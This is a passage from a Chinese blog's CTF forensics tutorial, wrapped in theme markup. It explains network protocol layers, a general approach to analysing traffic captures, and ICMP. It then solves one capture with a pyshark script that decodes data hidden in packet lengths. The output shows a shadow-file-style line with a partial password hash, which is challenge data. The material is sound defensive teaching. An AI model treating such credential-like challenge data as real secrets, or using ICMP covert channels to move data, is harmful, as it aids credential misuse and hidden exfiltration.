+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/style.css"><meta name="generator" content="Hexo 6.3.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202303232356277.png"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.getElementById('loading-box').classList.add("loaded");
+  },
+  initLoading: () => {
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+setTimeout(function(){preloader.endLoading();},10000)
+
+if (true) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">嘻哈磕碜のBlogs</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 归档</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><i class="anzhiyufont anzhiyu-icon-artstation faa-tada" style="font-size: 0.9em;"></i><span> 朋友圈</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/bangumis/"><i class="anzhiyufont anzhiyu-icon-bilibili faa-tada" style="font-size: 0.9em;"></i><span> 追番页</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/album/"><i class="anzhiyufont anzhiyu-icon-images faa-tada" style="font-size: 0.9em;"></i><span> 相册集</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/equipment/"><i class="anzhiyufont anzhiyu-icon-dice-d20 faa-tada" style="font-size: 0.9em;"></i><span> 我的装备</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="wechat" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="alipay" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/ChatGpt/" style="font-size: 1.05rem;">ChatGpt<sup>2</sup></a><a href="/tags/Java/" style="font-size: 1.05rem;">Java<sup>1</sup></a><a href="/tags/MISC/" style="font-size: 1.05rem;">MISC<sup>2</sup></a><a href="/tags/MSF/" style="font-size: 1.05rem;">MSF<sup>1</sup></a><a href="/tags/Navicat/" style="font-size: 1.05rem;">Navicat<sup>1</sup></a><a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 1.05rem;">Web安全<sup>9</sup></a><a href="/tags/binwalk/" style="font-size: 1.05rem;">binwalk<sup>1</sup></a><a href="/tags/docker/" style="font-size: 1.05rem;">docker<sup>4</sup></a><a href="/tags/java/" style="font-size: 1.05rem;">java<sup>1</sup></a><a href="/tags/mysql/" style="font-size: 1.05rem;">mysql<sup>1</sup></a><a href="/tags/oracle/" style="font-size: 1.05rem;">oracle<sup>1</sup></a><a href="/tags/owasp/" style="font-size: 1.05rem;">owasp<sup>1</sup></a><a href="/tags/phpstudy/" style="font-size: 1.05rem;">phpstudy<sup>1</sup></a><a href="/tags/python/" style="font-size: 1.05rem;">python<sup>1</sup></a><a href="/tags/redis/" style="font-size: 1.05rem;">redis<sup>1</sup></a><a href="/tags/shiro/" style="font-size: 1.05rem;">shiro<sup>1</sup></a><a href="/tags/sql/" style="font-size: 1.05rem;">sql<sup>1</sup></a><a href="/tags/ssrf/" style="font-size: 1.05rem;">ssrf<sup>1</sup></a><a href="/tags/xss/" style="font-size: 1.05rem;">xss<sup>2</sup></a><a href="/tags/%E5%AE%B9%E5%99%A8/" style="font-size: 1.05rem;">容器<sup>1</sup></a><a href="/tags/%E6%8A%A4%E7%BD%91/" style="font-size: 1.05rem;">护网<sup>1</sup></a><a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 1.05rem;">数据库<sup>2</sup></a><a href="/tags/%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/" style="font-size: 1.05rem;">测试工具<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
+    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/12/"><span class="card-archive-list-date">十二月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">9</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/11/"><span class="card-archive-list-date">十一月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">14</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/10/"><span class="card-archive-list-date">十月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">13</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/09/"><span class="card-archive-list-date">九月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/08/"><span class="card-archive-list-date">八月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">10</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/07/"><span class="card-archive-list-date">七月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">3</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/06/"><span class="card-archive-list-date">六月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url">网络安全</a><i class="anzhiyufont anzhiyu-icon-angle-right post-meta-separator"></i><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/CTF/" itemprop="url">CTF</a><i class="anzhiyufont anzhiyu-icon-angle-right post-meta-separator"></i><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/CTF/WP/" itemprop="url">WP</a></span><span class="article-meta tags"></span></div></div><h1 class="post-title" itemprop="name headline">CTF训练营-forensics</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-01-15T07:42:41.000Z" title="发表于 2024-01-15 15:42:41">2024-01-15</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-01-15T08:44:39.997Z" title="更新于 2024-01-15 16:44:39">2024-01-15</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">13.1k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>46分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="CTF训练营-forensics"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为东莞"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>东莞</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401151644862.png"></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="https://hihopkc.github.io/posts/96d6.html"><header><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url">网络安全</a><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/CTF/" itemprop="url">CTF</a><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/CTF/WP/" itemprop="url">WP</a><h1 id="CrawlerTitle" itemprop="name headline">CTF训练营-forensics</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">hihopkc</span><time itemprop="dateCreated datePublished" datetime="2024-01-15T07:42:41.000Z" title="发表于 2024-01-15 15:42:41">2024-01-15</time><time itemprop="dateCreated datePublished" datetime="2024-01-15T08:44:39.997Z" title="更新于 2024-01-15 16:44:39">2024-01-15</time></header><h1 id="网络流量分析"><a href="#网络流量分析" class="headerlink" title="网络流量分析"></a>网络流量分析</h1><p>网络流量分析是指利用分析技术和统计手段对网络数据包进行处理，从而实现对网络的行为分析、性能分析和故障诊断等。它也是网络取证中经常使用的手段。</p>
+<p>在几乎所有的CTF 比赛中，都会涉及对网络流量分析能力的考查，尤其是在企业或者行业内部的比赛中，此类题目属于必考题目。这类题目的难度适中，涉及的知识面广泛，能有效结合企业内部的业务，因此建议各位读者重点关注并熟练掌握。</p>
+<p>进行网络流量分析需要掌握多方面的知识，不仅涉及杂项知识，还需要结合 Web 渗透等方面的基础知识。</p>
+<h1 id="网络协议的基础知识"><a href="#网络协议的基础知识" class="headerlink" title="网络协议的基础知识"></a>网络协议的基础知识</h1><p>网络协议是为在网络中进行数据交换而建立的规则、标准或约定的集合，通常也简称为协议。互联网的核心是一系列协议，总称为互联网协议(Internet Protocol Suite),它们对计算机如何连接和组网做出了详尽的规定，一个协议通常只为一个目的而设计。那么应该如何设计网络协议呢?</p>
+<p>ARPANET(阿帕网)是美国国防高级研究计划局开发的世界上第一个运营的数据包交换网络，是全球互联网的鼻祖。但是，ARPANET 无法和使用不同操作系统的计算机进行网络交流，这引发了研究者的思考。ARPANET的研制经验表明，对于非常复杂的网络协议，其结构应该是层次式的。1984 年，国际标准化组织(Interational Organization forStandardization，ISO)发布了ISO&#x2F;IEC 7498标准，它定义了网络互连的7层框架，也就是开放式系统互连参考模型(Open System Interconnection Reference Model，OSI&#x2F;RM)</p>
+<table>
+<thead>
+<tr>
+<th>层次</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>应用层</td>
+<td>OSI体系结构中的最高层，是网络服务与最终用户的一个接口</td>
+</tr>
+<tr>
+<td>表示层</td>
+<td>实现数据的表示、压缩和安全性</td>
+</tr>
+<tr>
+<td>会话层</td>
+<td>建立、管理、终止会话</td>
+</tr>
+<tr>
+<td>传输层(运输层)</td>
+<td>定义传输数据的协议端口号，以及流量控制和差错校验等</td>
+</tr>
+<tr>
+<td>网络层(网际层)</td>
+<td>进行逻辑地址寻址，实现不同网络之间的路径选择</td>
+</tr>
+<tr>
+<td>数据链路层</td>
+<td>实现建立逻辑链路、物理地址寻址、差错校验等功能</td>
+</tr>
+<tr>
+<td>物理层</td>
+<td>利用传输介质为数据链路层提供物理连接，实现比特流的透明传输</td>
+</tr>
+</tbody></table>
+<p>OSI期望达到一种理想境界，即全球网络都遵循这个统一的标准，因此在标准制定的过程中试图涵盖当时最先进的技术，导致制定周期漫长。当OSI标准还在讨论时，一种新的网络协议在工业界被广泛采纳，而且被众多厂商使用，这就是TCP&#x2F;IP。于是，OSI面临着非常尴尬的局面:大公司和厂商都认可 OSI，但几乎找不到厂商能生产出符合 OSI标准的商用产品;而基于TCP&#x2F;IP 的互联网已抢先在全球大范围运行，成为事实上的国际标准。</p>
+<p>传输控制协议&#x2F;网际协议(Transmission Control Protocol&#x2F;Internet Protocol，TCP&#x2F;IP)包含应用层、传输层(也称为运输层)、网络层(也称为网际层) 和网络接口层。但在学习计算机网络原理时，往往采取折中的方法，综合 OSI和TCP&#x2F;IP 的优点，采用一个五层协议的体系结构，这样的体系结构称为协议栈。不同协议栈的体系如下图所示。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401102158721.png" alt="image-20240110215858582"></p>
+<p>有了协议栈的概念，我们就可以描述主机之间是如何通信的，如图1.22所示。主机A、B、C均有自己的网络协议栈，A向B发起请求，需要使用协议栈中各层提供的服务。图中的客户端程序和服务端程序都可以看作进程，若仅考虑进程之间的交互，则可以看作虚线表示的连接。对于相应的协议，我们可以按照下面的描述简单理解，网络层的IP 协议头部会保存要连接的主机的IP 地址，传输层的 TCP或UDP 的头部会保存端口信息，IP地址可以确定连接的主机，但不能确定是哪个进程，端口信息可以确定和哪个进程完成信息交互。</p>
+<h1 id="CTF流量分析的通用方法"><a href="#CTF流量分析的通用方法" class="headerlink" title="CTF流量分析的通用方法"></a>CTF流量分析的通用方法</h1><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401102221488.png" alt="image-20240110222139343"></p>
+<p>打开离线流量文件后，可以先观察一下分组数。如果分组数小于1000个，可以手工逐个数据包查看。因为当数据包个数较少时，协议分级的效果并不明显。而且，如果题目的分组数较少，说明考点较为直接，杂包过滤可能并不是重点。</p>
+<p>如果分组数较多，通过协议分级可以看到各协议所占的比例。如果流量中存在Telnet、FTP、ICMP等明文传输协议，建议通过追踪流或过滤的方法，优先查看这些协议的通信过程。</p>
+<p>如果没有上述协议，而是存在大量的HTTP(所谓“大量”，一般是指字节数占比较大)，那么HTTP就是接下来分析的重点。通过“统计-HTTP-请求”工具，可以查看所有URL的详细信息。对于一般的Wb流量，通过URL就可以看到所有请求的资源。如果是SQL注入攻击流量，在URL中会有大量的SQL特征。如果是菜刀、蚁剑等工具生成的流量，会存在大量的POST包，通过逐个查看POST请求的返回包，也可以掌握通信过程。关于HTTP的详细分析方法会在后面内容中说明。</p>
+<p>如果离线文件中均无上述协议，就需要结合题目的描述进行针对性分析。例如，若题目中存在大量DNS协议，就需要重点关注查询的域名以及对该域名的响应。假如存在USB协议，则需要结合协议载荷判断设备类型，再根据设备通信规则复原出传输的信息。</p>
+<h2 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h2><p>ICMP(Internet Control Message Protocol)也称为Internet 控制报文协议，它允许主机或路由器报告差错情况，并提供有关异常的报告。这些控制消息虽然不传输用户数据，但是对于用户数据的传递起着重要作用。需要注意的是:ICMP并不是高层协议，它和IP 同属于网络层，但是ICMP报文封装到IP数据报中。ICMP报文如图所示，它的报文头部为8字节，定义如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _icmphdr&#123;</span><br><span class="line">	unsigned char i_type;	//8比特，类型</span><br><span class="line">	unsigned char i_code;	//8比特，代码</span><br><span class="line">	unsigned short i_cksum;	//16比特，校验和</span><br><span class="line">	unsigned short i_id;	//标识符(一般用进程号作为标识符)，用于匹配ECHO和ECHO REPLY包</span><br><span class="line">	unsigned short i_seq;	//报文序列号，用于标记ECHO报文顺序</span><br><span class="line">	unsigned int timestamp	//时间戳或未使用</span><br><span class="line">&#125;ICMP_HEADER;</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401141616246.png" alt="image-20240114161624123"></p>
+<p>ICMP的一个重要应用是分组网间探测(Packet InterNet Groper，PING)，它可以用于测试两个主机之间的连通性。PING使用了ICMP 回送(echo)请求与回送回答报文。ICMP echo报文如下所示</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401141620744.png"></p>
+<p>不难发现，数据部分可以用来传输消息。不同操作系统的数据部分的填充方法略有区别：在Windows系统下采用小写字母a<del>w循环：在Linux系统下，使用“-p”选项可以指定发送的数据，默认是0x00</del>0xFF的循环</p>
+<p>此时，读者们应该能想到ICMP的一种出题方法，就是在数据部分隐藏flag，将flag编码或者加密后经ICMP 请求包传输。这个考点较为简单，在发现ICMP数据部分异常后就转化为上节介绍的常见编码的问题。</p>
+<p>数据部分明文传输的相关题目比较简单，为了增加比赛难度，一些出题人会想出新的考点。ICMP的另一个考点是以数据部分的长度表示要传输的信息，其本质是基于文本的信息隐藏</p>
+<h3 id="例题fetus-pcap-pcap"><a href="#例题fetus-pcap-pcap" class="headerlink" title="例题fetus_pcap.pcap"></a>例题fetus_pcap.pcap</h3><blockquote>
+<p>不久前，运维人员在日常安全检查的时候发现现场某设备会不时向某不知名ip发出非正常的<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=ICMP&spm=1001.2101.3001.7020">ICMP</a> PING包。这引起了运维人员的注意，他在过滤出ICMP包分析并马上开始做应急处理很可能已被攻击的设备。运维人员到底发现了什么? flag形式为 flag{}</p>
+</blockquote>
+<p>流量分析题，分析的方法基本上有：binwalk、查找一些可疑字符串或16进制数据，排序流量包的长度(最长的流量包一般很可疑)；当我们对流量包的长度进行排序时，发现流量包最短90字节，最长也不过164字节，其中的data段数据长度从48到122，而ascii表中第48至122个字符为0123456789:;&lt;&#x3D;&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[]^_&#96;abcdefghijklmnopqrstuvwxyz，于是将每个流量包的长度转换为对应字符，然后连接成一段长字符串，看上去像base64编码，对字符串进行base64解码即可!</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from pyshark.capture.file_capture import FileCapture</span><br><span class="line">from base64 import b64decode</span><br><span class="line">from sys import argv</span><br><span class="line"> </span><br><span class="line">def solve(file_name):</span><br><span class="line">    packets=FileCapture(input_file=file_name)</span><br><span class="line">    res=&#x27;&#x27;</span><br><span class="line">    for packet in packets:</span><br><span class="line">        for pkt in packet:</span><br><span class="line">            if pkt.layer_name==&#x27;icmp&#x27; and int(pkt.type,16):</span><br><span class="line">                res+=chr(int(pkt.data_len))</span><br><span class="line">    return b64decode(res)</span><br><span class="line"> </span><br><span class="line">if __name__==&#x27;__main__&#x27;:</span><br><span class="line">    print(solve(argv[1]))</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ python rsa.py fetus_pcap.pcap </span><br><span class="line">b&#x27;::\\nmongodb:!:17843:0:99999:7:::\\nubuntu:$6$LhHRomTE$M7C4n84UcFLAG&#123;xx2b8a_6mm64c_fsociety&#125;::&#x27;</span><br></pre></td></tr></table></figure>
+
